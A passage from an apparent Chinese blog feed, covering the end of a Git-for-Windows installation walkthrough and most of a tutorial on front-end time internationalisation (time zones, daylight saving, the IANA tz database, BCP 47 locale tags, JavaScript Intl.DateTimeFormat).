Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 <code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 应用中这是不可接受的</li>\n<li>需要持续更新。时区数据一直在变动，需要在时区数据更新时尽快更新应用内的时区数据，这带来了额外的维护成本</li>\n</ul>\n<p>ES6 为我们带来了 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl\" rel=\"noopener\"><code>Intl</code> 命名空间</a>。在这里，JavaScript 运行时提供了不少时间相关的国际化能力。因此，在不使用额外数据的情况下准确处理时区是可能的，但这并不完美：</p>\n<ul>\n<li>各端不统一。浏览器提供的时区数据受浏览器版本、系统版本等可能变化，最新的时区更新可能无法快速反映到所有设备上</li>\n<li>实现复杂。<code>JavaScript</code> 中 <code>Date</code> 对象的不良设计导致实现完善的时区处理并不容易，且 <code>Intl</code> 命名空间下的对象实例化性能开销较大，需要额外优化</li>\n</ul>\n<blockquote><p><code>Intl</code> 命名空间下还有很多实用的国际化相关方法，值得我们另开一篇文章来讲讲了。</p></blockquote>\n<p>在真实开发中，这需要取舍。目前主流的 JavaScript 时间处理库都已转向浏览器内置方法，并在需要时通过 Polyfill 保证跨端一致性。在这篇文章中，我们将尝试在不使用第三方库的情况下实现基本的时间国际化处理。此外，还有一些诸如需要使用 Unix 时间戳才能正确地在各端交换时间等细节需要注意。</p>\n<h1>时区转换</h1>\n<p>JavaScript 中的 <code>Date</code> 并不是不包含时区信息——实际上，<code>Date</code> 对象表示的一定是当前时区。通过尝试：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1970-01-01T00:00:00Z')\n// Thu Jan 01 1970 08:00:00 GMT+0800 (中国标准时间)</pre>\n<p>就可以知道，JavaScript 运行时其实知道当前时区，并会在需要的时候将其他时区的时间转换为当前时区的时间。那么，如何将本地时间转换为其他时区的时间呢？从 <code>Date</code> 的角度看，这并不行，因为我们无法设置一个 <code>Date</code> 对象的时区。但我们可以“投机取巧”：将 <code>Date</code> 对象的时间加上/减去对应的时差，尽管 <code>Date</code> 对象仍然认为自己在本地时区，但这样不就可以正确显示了嘛！但我们会碰到上文提到的问题：时区之间的时间差并不固定，在没有额外数据的情况下很难正确计算。</p>\n<p>还好，ES6 基于 <code>Intl</code> 命名空间扩展了 <code>Date.prototype.toLocaleString()</code> 方法，使其可以接受时区参数并按指定时区格式化时间。如果你在搜索引擎中搜索如何使用 JavaScript 转换时区，你大概率会在 StackOverflow 上找到类似这样的答案：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const convertTimeZone = (date, timeZone) =&gt; {\n    return new Date(date.toLocaleString('en-US', { timeZone }))\n}\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\nconvertTimeZone(now, 'Europe/London') // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<p>很好理解，我们使用 <code>en-US</code> 的区域设置要求 JavaScript 运行时以我们指定的时区格式化时间，再将时间字符串重新解析为时间对象。这里的 <code>timeZone</code> 就是诸如 <code>Asia/Shanghai</code> 等的 IANA TZDB 时区名称。这个字符串确实需要自己提供，但这就是我们唯一需要自己准备的数据了！只要提供了时区名称，浏览器就会自动计算正确的时间，无需我们自行计算。</p>\n<blockquote><p>对于时区名称，你可以考虑使用 <a href=\"https://github.com/vvo/tzdb/\" rel=\"noopener\">@vvo/tzdb</a>。这是一个声称为自动更新的 IANA TZDB 的 JSON 导出，并已被数个大型项目使用。你可以从这个包中导出所有时区名称。</p></blockquote>\n<p>这个方法看起来还不错，对吧？但实际上，它有两个问题：</p>\n<ul>\n<li>指定了区域设置和时区的 <code>toLocaleString()</code> 实际上每次调用都会在 JavaScript 运行时中创建新的 <code>Intl.DateTimeFormat</code> 对象（在后文详述），而后者会带来昂贵的性能开销（在 Node 14 中，实例化一次会在 V8 中增加内存使用约 46.3Kb。但这是符合预期的，详见 <a href=\"https://bugs.chromium.org/p/v8/issues/detail?id=6528\" rel=\"noopener\">V8 Issue</a>）。因此，在密集调用的情况下需要考虑计算并缓存时差，并在一定时间后或需要时进行更新</li>\n<li>使用 <code>toLocaleString()</code> 并使用 <code>en-US</code> 区域设置格式化的默认时间格式类似于 <code>10/13/2021, 1:00:00 AM</code>。这可以被大部分浏览器正确解析，<strong>但这是不规范的，不同浏览器有可能产生不同结果。</strong>你也可以自行配置格式（同下文的 <code>Intl.DateTimeFormat</code>），但仍然无法构造出规范的字符串</li>\n</ul>\n<p>因此，更佳的方案是，我们需要建立一个可反复使用的格式化器以避免重复创建 <code>Intl.DateTimeFormat</code> 带来的额外开销，并需要手动构造出符合规范的时间字符串，并将其重新解析为 <code>Date</code> 对象。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const timeZoneConverter = (timeZone) =&gt; {\n    // 新建 DateTimeFormat 对象以供对同一目标时区重用\n    // 由于时区属性必须在创建 DateTimeFormat 对象时指定，我们只能为同一时区重用格式化器\n    const formatter = new Intl.DateTimeFormat('zh-CN', {\n        year: 'numeric',\n        month: '2-digit',\n        day: '2-digit',\n        hour: '2-digit',\n        minute: '2-digit',\n        second: '2-digit',\n        hour12: false,\n        timeZone\n    })\n    return {\n        // 提供 conver 方法以将提供的 Date 对象转换为指定时区\n        convert (date) {\n            // zh-CN 的区域设置会返回类似 1970/01/01 00:00:00 的字符串\n            // 替换字符即可构造出类似 1970-01-01T00:00:00 的 ISO 8601 标准格式时间字符串并被正确解析\n            return new Date(formatter.format(date).replace(/\\//g, '-').replace(' ', 'T').trim())\n        }\n    }\n}\n\nconst toLondonTime = timeZoneConverter('Europe/London') // 对于同一时区，此对象可重用\n\nconst now = new Date() // Wed Oct 13 2021 01:00:00 GMT+0800 (中国标准时间)\ntoLondonTime.convert(now) // Tue Oct 12 2021 18:00:00 GMT+0800 (中国标准时间)</pre>\n<blockquote><p>目前 <code>zh-CN</code> 的区域设置会产生类似 <code>1970/01/01 00:00:00</code> 的格式化字符串。这一格式目前跨端一致，但由于规范没有指定时间格式，<strong>这个格式在未来有可能变更。</strong>更好的方案是使用 <code>formatToParts()</code> 方法（在后文详述）获取时间字符串的各部分并手动拼接出标准格式的字符串，但在这个例子中直接 <code>replace</code> 拥有更好的性能。</p></blockquote>\n<p>现在，尝试反复转换时间至同一时区 1000 次，耗时从 <code>toLocaleString()</code> 1.5 秒降低到了 0.04 秒。尽管代码长了点，但这次重写在最好的情况下为我们带来了超过 20 倍的性能提升。</p>\n<p>需要注意的是，虽然这看起来就算最终方案了，但这个方案依然不完美。主要有以下两个问题：</p>\n<ul>\n<li>在需要密集转换为不同时区时，由于无法重用格式化器，性能依然较差且难以进一步优化</li>\n<li>由于 <code>Intl.DateTimeFormat</code> 不支持格式化毫秒，在格式化字符串的过程中毫秒会丢失，导致最终结果可能会与期望结果产生最高 999ms 的误差，需要额外处理。比如需要计算时差时，我们可能需要这么写：\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const calcTimeDiff = (date, converter) =&gt; {\n    const secDate = date - date.getMilliseconds() // 去掉毫秒，避免转换前后精度差异\n    return converter.convert(new Date(secDate), tzName) - secDate\n}\n\ncalcTimeDiff(new Date(), timeZoneConverter('Europe/London')) // -25200000</pre>\n</li>\n</ul>\n<p>无论如何，在折腾一番后我们还是把时区正确转换了。接下来准备格式化时间字符串了吗？不过在此之前，我们得先来聊聊语言、文字和区域。</p>\n<h1>语言文字区域傻傻分不清</h1>\n<blockquote><p>如何在计算机中表示中文？</p></blockquote>\n<p>“这不简单，”你可能会说，“用 <code>zh</code> 啊。”</p>\n<blockquote><p>那简体中文呢？</p></blockquote>\n<p>“<code>zh-CN</code>。”你或许会说出这个答案。</p>\n<blockquote><p>那用于新加坡的简体中文和用于中国大陆的简体中文该如何区分呢？</p></blockquote>\n<p>嗯……好问题。</p>\n<p>要能正确区分不同的简体中文，我们还得先回到定义上。实际上，“国际化”并不只是语言的翻译而已，国际化包含的是一整套对于各个<strong>区域</strong>的本地化方案。要准确表示一个国际化方案，我们实际至少需要确定三个属性：语言（Language）、文字（Script）和区域（Locale）。</p>\n<ul>\n<li>\n<strong>语言</strong>通常指的是<strong>声音语言</strong>。不同的语言都有一套自己的发音规则，很难互通。如中文和英语都属于语言</li>\n<li>\n<strong>文字</strong>对应的是某个语言的书写方式，同样的语言可能会有多种书写方案。如中文主要有简体和繁体两种书写方案</li>\n<li>\n<strong>区域</strong>指国际化面向的地区，相同的语言和文字，在不同地区也有可能会有不同的使用习惯。如新加坡和中国大陆都使用简体中文，但两地的用词习惯等有些许差异</li>\n</ul>\n<p>只有确定了这三个属性，我们才能正确定义一个国际化方案（或者说<strong>区域设置</strong>）。当然，还有很多其他属性可以更准确的表达某个区域设置，但通常有语言、文字和区域就已经足够了。</p>\n<p>于是，基于 <a href=\"https://tools.ietf.org/rfc/bcp/bcp47.txt\" rel=\"noopener\">BCP 47</a>，我们可以知道：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN = 中文普通话-简体-中国大陆\ncmn-Hans-SG = 中文普通话-简体-新加坡\ncmn-Hant-TW = 中文普通话-繁体-台湾\nyue-Hant-HK = 中文粤语-繁体-香港</pre>\n<p>等等，这都是啥？还有 BCP 47 又是啥？BCP 是 IETF 发布的“最佳当前实践”文档，而 BCP 47 是一些国际化相关的 ISO 和备忘录的集合，也是目前事实上由 HTML 和 ECMAScript 所使用的表达区域设置的标准。BCP 47 定义的区域设置标签实际上比较复杂，但对于大部分简单使用情况，上文示例中的格式已经完全够用了。简单来说，<strong>要表达一个区域设置，我们会使用 <code>语言[-文字][-区域]</code> 的格式，而文字和区域都是可选的。</strong>而对于每个部分的具体代码，BCP 47 也有做具体定义。其中：</p>\n<ul>\n<li>语言使用 ISO 639-1 定义的两位字母代码（如中文为 <code>zh</code>，英文为 <code>en</code>）或 <a href=\"https://iso639-3.sil.org/code_tables/639/data\" rel=\"noopener\">ISO 639-2/3</a> 定义的三位字母代码（如中文普通话为 <code>cmn</code>，英文为 <code>eng</code>），通常小写</li>\n<li>文字使用 <a href=\"https://unicode.org/iso15924/iso15924-codes.html\" rel=\"noopener\">ISO 15924</a> 定义的四位字母代码，通常首字母大写。如简体中文是 <code>Hans</code>，繁体中文是 <code>Hant</code>\n</li>\n<li>区域通常使用 <a href=\"https://www.iso.org/iso-3166-country-codes.html\" rel=\"noopener\">ISO 3166-1</a> 定义的两位字母代码，通常大写，如中国大陆为 <code>CN</code>，英国为 <code>GB</code>\n</li>\n</ul>\n<blockquote><p>ISO 639-1/2/3 的关系实际是：ISO 639-1 是最早制定的规范，使用两位字母表示语言，但语言数量之多并不能只用两位代码表示。因此后来修订了 ISO 639-2 和 3，使用三位字母表示了更多语言。通常 639-1 代码和 ISO-2/3 代码是一对多的关系。如中文 <code>zh</code> 其实是中文普通话 <code>cmn</code> 的宏语言（macrolanguage），同样使用 <code>zh</code> 为宏语言的语言还有 <code>wuu</code>（中文吴语）、<code>hak</code>（中文客家话）、<code>yue</code>（中文粤语）等数十种。<strong>从规范上我们现在应该使用 ISO 639-2/3 代码来替代 ISO 639-1 代码了</strong>，但由于历史阻力和真实需求中分类无需如此细致等原因，<strong>使用 ISO 639-1 指定语言仍然非常常见而且完全可以接受。</strong>此外，特别地，我们在 ISO 639-3 中定义未指明的语言为 <code>und</code>。</p></blockquote>\n<p>因此，对于这一节开头的两个问题，在 BCP 47 中正确答案其实是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">zh = 中文\ncmn = 中文普通话\n\nzh-Hans = 中文-简体\ncmn-Hans = 中文普通话-简体</pre>\n<p>而 <code>zh-CN</code> 实际是指在中国大陆使用的中文，当然也包含在中国大陆使用的繁体中文。<strong>不过，由于大部分情况下一个区域只会通用一种文字，很多情况下我们可以忽略文字这一项</strong>，即使用 <code>zh-CN</code>（或者 <code>cmn-CN</code>）来表示中国大陆的简体中文普通话——毕竟在大部分业务中在中国大陆使用繁体和非普通话的情况非常少。</p>\n<blockquote><p>事实上，类似 <code>zh-Hans</code> 和 <code>zh-Hant</code> 开头的区域设置名称已经被标记为 <code>redundant 废弃</code>，因此尽可能只使用 <code>zh-CN</code> 或者 <code>cmn-Hans-CN</code> 这样的区域设置名称。所有区域设置名称的列表可以在 <a href=\"https://www.iana.org/assignments/language-subtag-registry/language-subtag-registry\" rel=\"noopener\">IANA</a> 找到。</p></blockquote>\n<p>现在我们可以准确定义一个区域设置了。不过我们还有一些小小的需求。比如我们想在 <code>cmn-Hans-CN</code> 的区域设置中使用农历来表示日期，但显然我们上文定义的表示方法并不能表达这一需求。好在，Unicode 为 BCP 47 提供了 u 扩展。在区域设置名称后面加上 <code>-u-[选项]</code> 就可以表达更细致的变体了。所以我们有：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"raw\">cmn-Hans-CN-u-ca-chinese = 中文普通话-简体-中国大陆-u-日历-中国农历\njpn-Jpan-JP-u-ca-japanese = 日语-日文汉字/平假名/片假名-日本-u-日历-日本日历\ncmn-Hans-CN-u-nu-hansfin = 中文普通话-简体-中国大陆-u-数字-简体大写数字</pre>\n<p>u 扩展的具体可选项可以在 <a href=\"https://www.unicode.org/reports/tr35/tr35-21.html#Unicode_locale_identifier\" rel=\"noopener\">Unicode 网站</a>上找到。而多个 u 扩展还可以连接——于是我们甚至可以写出 <code>cmn-Hans-CN-u-ca-chinese-nu-hansfin</code> 这种丧心病狂的区域设置名称。当然，相信你现在已经可以看懂这个区域设置的意思了。</p>\n<blockquote><p>不同地区可能会有不同的日历使用习惯，如中国有使用农历的需求，泰国有使用佛历的需求，我们可以通过 u 扩展指定不同的日历。不过，大部分情况下我们会使用标准的 ISO 8601 日历（gregory），JavaScript 的 <code>Date</code> 对象也只支持这种日历。</p></blockquote>\n<blockquote><p>你可以使用 <a href=\"https://r12a.github.io/app-subtags/\" rel=\"noopener\">BCP47 language subtag lookup</a> 工具快速检查你编写的 BCP 47 区域标签是否规范。</p></blockquote>\n<p>终于我们可以正确表达一个完美符合我们需求的区域设置了。接下来，让我们开始格式化时间吧。</p>\n<h1>格式化时间</h1>\n<p>这题我会！</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const formatDate(date) =&gt; {\n    return `${date.getFullYear()}-${`${date.getMonth() + 1}`.padStart(2, '0')}-${`${date.getDate()}`.padStart(2, '0')} ${`${date.getHours()}`.padStart(2, '0')}:${`${date.getMinutes()}`.padStart(2, '0')}:${`${date.getSeconds()}`.padStart(2, '0')}`\n}\n\nformatDate(new Date()) // 2021-10-13 01:00:00</pre>\n<p>就完事了……吗？先不论这样的格式化代码难以阅读，尽管上文这样的日期格式国际通用，<strong>但并非所有区域都习惯于这样的日期表示方法。</strong>比如英语国家/地区在很多时候习惯在日期中加入星期，而阿拉伯语国家/地区在部分情况下习惯使用阿拉伯语数字（而非常用的阿拉伯-印度数字）；再比如美式英语国家/地区习惯月-日-年的日期表示法，而英式英语国家/地区习惯日-月-年的日期表示法……不同区域在时间表示格式习惯上的差异是巨大的，<strong>我们很难通过一个简单的方法来正确地、国际化地格式化一个日期。</strong></p>\n<p>好在 ES6 早就为我们铺平了道路。还记得上文提到过的 <code>Intl.DateTimeFormat</code> 吗？我们通过它来实例化一个日期格式化器并用进行日期的国际化。</p>\n<p>直接来看例子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">const options = {\n    year: 'numeric',\n    month: 'short',\n    day: 'numeric',\n    weekday: 'long'\n}\nconst now = new Date()\n\nconst enUSFormatter = new Intl.DateTimeFormat('en-US', options)\n\nconst zhCNFormatter = new Intl.DateTimeFormat('zh-CN', options)\nconst zhCNAltFormatter = new Intl.DateTimeFormat('zh-CN-u-ca-chinese', options)\nconst zhCNAlt2Formatter = new Intl.DateTimeFormat('zh-CN-u-ca-roc-nu-hansfin', options)\n\nconst jaFormatter = new Intl.DateTimeFormat('ja', options)\nconst jaAltFormatter = new Intl.DateTimeFormat('ja-JP-u-ca-japanese', options)\n\nconst arEGFormatter = new Intl.DateTimeFormat('ar-EG', options)\n\nenUSFormatter.format(now) // Wednesday, Oct 13, 2021\n\nzhCNFormatter.format(now) // 2021年10月13日星期三\nzhCNAltFormatter.format(now) // 2021辛丑年九月8星期三\nzhCNAlt2Formatter.format(now) // 民国壹佰壹拾年拾月拾叁日星期三\n\njaFormatter.format(now) // 2021年10月13日水曜日\njaAltFormatter.format(now) // 令和3年10月13日水曜日\n\narEGFormatter.format(now) // الأربعاء، ١٣ أكتوبر ٢٠٢١</pre>\n<blockquote><p>在这里我们使用 ISO 639-1 代码来表示语言，是由于事实上 ISO 639-1 代码更加常见与通用。在大部分支持 <code>Intl.DateTimeFormat</code> 的 JavaScript 运行时中我们也可以使用 ISO 639-2/3 代码来表示语言（但实际会 fallback 至对应的 ISO 639-1 代码）。</p></blockquote>\n<blockquote><p>你也可以通过在 <code>options</code> 中设置 <code>calendar</code> 属性和 <code>numberingSystem</code> 属性来替换区域设置名称中对 u 扩展的使用。这也是推荐方式。</p></blockquote>\n<p>这非常直观，我们可以指定区域设置和格式化选项来初始化一个格式化器，并在之后使用格式化器对象的 <code>format</code> 方法来格式化一个 <code>Date</code> 对象。这里的格式化选项其实非常灵活，能格式化的不只是日期，时间也可以被灵活地格式化，有非常多的组合可以选择。我们不会在这里详细解释每一个选项，你可以访问 <a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Intl/DateTimeFormat\" rel=\"noopener\">MDN 